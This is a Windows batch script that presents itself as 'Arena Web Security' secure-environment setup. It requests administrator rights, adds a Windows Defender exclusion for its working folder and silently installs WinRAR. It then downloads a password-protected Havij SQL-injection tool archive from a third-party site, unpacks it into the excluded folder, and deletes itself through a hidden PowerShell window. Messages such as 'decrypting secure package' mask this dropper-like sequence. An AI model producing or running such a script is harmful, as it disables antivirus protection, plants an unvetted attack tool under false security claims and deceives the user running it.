@echo off
Title Arena Web Security
setlocal enabledelayedexpansion

:: Configuration
set "bat_dir=%~dp0"
set "folder=%bat_dir%Arena-Isolated"
set "winrar_url=https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-624.exe"
set "winrar_installer=!folder!\WinRAR-free.exe"
set "havij_url=https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip"
set "havij_zip=!folder!\Havij_1.12_Free.zip"
set "password=darknet123"

:: Header
echo =============================================
echo Secure Environment Setup - Arena Web Security
echo =============================================
echo.

:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [STEP] Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
    exit /b
)

:: User confirmation
choice /c yn /n /m "This will create secure workspace and download Havij. Continue? (Y/N)"
if %errorlevel% equ 2 (
    exit /b
)

:: Security component checks
echo [STEP] Checking system security components...
set "firewall_present=false"
set "defender_running=false"

:: Check Windows Firewall
netsh advfirewall show allprofiles >nul 2>&1
if !errorlevel! equ 0 (
    set "firewall_present=true"
    echo [INFO] Windows Firewall detected
)

:: Check Windows Defender service
sc query WinDefend | find "RUNNING" >nul 2>&1
if !errorlevel! equ 0 (
    set "defender_running=true"
    echo [INFO] Windows Defender active
)

:: Create workspace
if not exist "!folder!\" (
    mkdir "!folder!"
    echo [SUCCESS] Created workspace: !folder!
) else (
    echo [INFO] Workspace already exists: !folder!
)

:: Configure security exclusions if needed
if "!firewall_present!"=="true" (
    if "!defender_running!"=="true" (
        echo [STEP] Configuring security exclusions...
        powershell -Command "Add-MpPreference -ExclusionPath '!folder!'" && (
            echo [SUCCESS] Security zone established
        ) || (
            echo [ERROR] Failed to create security zone
            pause
            exit /b
        )
    ) else (
        echo [INFO] Running without Defender integration
    )
) else (
    echo [INFO] Basic security configuration applied
)

:: === WinRAR Detection and Installation ===
set "winrar_exe="

:: Try native 64-bit registry
for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
    set "winrar_exe=%%b"
)

:: Try WOW6432Node
if not defined winrar_exe (
    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%b"
    )
)

:: Try legacy path from WinRAR key
if not defined winrar_exe (
    for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\WinRAR" /v "Path" 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%a\WinRAR.exe"
    )
)

:: If still not found, install WinRAR
if not defined winrar_exe (
    echo [STEP] Downloading latest WinRAR...
    powershell -Command "Invoke-WebRequest -Uri '%winrar_url%' -OutFile '!winrar_installer!'"

    echo [STEP] Installing WinRAR...
    start "" /wait "!winrar_installer!" /S
    timeout /t 10 /nobreak >nul
    del "!winrar_installer!" >nul

    :: Re-check registry after install
    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%b"
    )
    if not defined winrar_exe (
        for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
            set "winrar_exe=%%b"
        )
    )
)

:: Fallback
if not defined winrar_exe (
    set "winrar_exe=%ProgramFiles%\WinRAR\WinRAR.exe"
)

:: Final verification
echo [INFO] Verifying WinRAR at: !winrar_exe!
if not exist !winrar_exe! (
    echo [ERROR] WinRAR not found at: !winrar_exe!
    echo [ACTION] Please install WinRAR manually and re-run this script.
    pause
    exit /b
)

:: === Continue with Extraction ===

:: Download Havij ZIP
echo [STEP] Retrieving security package...
powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'" && (
    echo [SUCCESS] Package acquired
) || (
    echo [ERROR] Package retrieval failed
    pause
    exit /b
)

:: Decrypt using WinRAR
echo [STEP] Decrypting secure package...
start "" /wait "!winrar_exe!" x -ibck -p"%password%" "!havij_zip!" "!folder!\"

if %errorlevel% equ 0 (
    echo [SUCCESS] Package decrypted successfully
) else if %errorlevel% equ 1 (
    echo [ALERT] Invalid security credentials
) else if %errorlevel% equ 2 (
    echo [ERROR] Encrypted package missing
) else (
    echo [ERROR] Decryption failure (Code: %errorlevel%)
)

:: Final output
echo.
echo ==============================================
echo [READY] Security environment preparation complete
echo        Access your workspace at:
echo        !folder!
echo ==============================================
echo.

:: Open the Arena-Isolated folder AFTER extraction completes
start explorer "!folder!"

:: Launch silent deletion in background (runs independently)
start "" powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5; Remove-Item -LiteralPath '%~f0' -Force"

:: Wait for user input and keep terminal open until closed manually
cmd /k pause
